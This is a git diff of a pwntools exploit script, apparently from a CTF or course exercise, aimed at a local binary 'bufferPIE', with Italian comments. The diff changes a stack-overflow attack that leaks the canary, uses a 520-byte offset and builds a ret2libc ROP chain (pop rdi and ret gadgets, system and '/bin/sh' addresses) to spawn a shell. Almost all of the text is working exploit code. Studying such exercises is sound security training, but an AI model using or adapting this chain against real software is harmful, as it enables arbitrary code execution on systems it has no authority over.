@@ -1,7 +1,6 @@
 import sys
 from pwn import *
 
-context.terminal = ["tmux", "splitw", "-h"]
 
 elf = context.binary = ELF('./bufferPIE')
 p = process(b"./bufferPIE")
@@ -29,13 +28,15 @@ log.success(f'Canary:{hex(canary)}')
 # Trovabile andando a inserire una sequenza de Brujin, di cui si riesce a riconoscere la distanza dalla partenza
 offset = b"\x41" * 520
 
-libc_base =  0x00007ffff7da1000     # Ottenuto con      ldd buffer
+libc_base =  0x00007ffff7dae000     # Ottenuto con      ldd buffer o con info proc mappings dentro gdb
 system = libc_base + 0x50f10        # Ottenuto con      readelf -s  /usr/lib/libc.so.6 | grep "system"
 bin_sh = libc_base + 0x1aae28       # Ottenuto con      strings -a -t x /usr/lib/libc.so.6| grep /bin/sh
 
-# Gadget ottenuti con ROPgadget
+# Gadget ottenibili con ROPgadget
 pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0] + elf.address    # Usato per inserire la stringa "/bin/sh" in RDI
+log.info(f'pop rdi found at:{hex(pop_rdi)}')
 ret = (rop.find_gadget(['ret']))[0] + elf.address                   # Usato per allineare lo stack a 16 byte
+log.info(f'ret found at:{hex(ret)}')
 
 payload = offset
 payload += p64(canary)
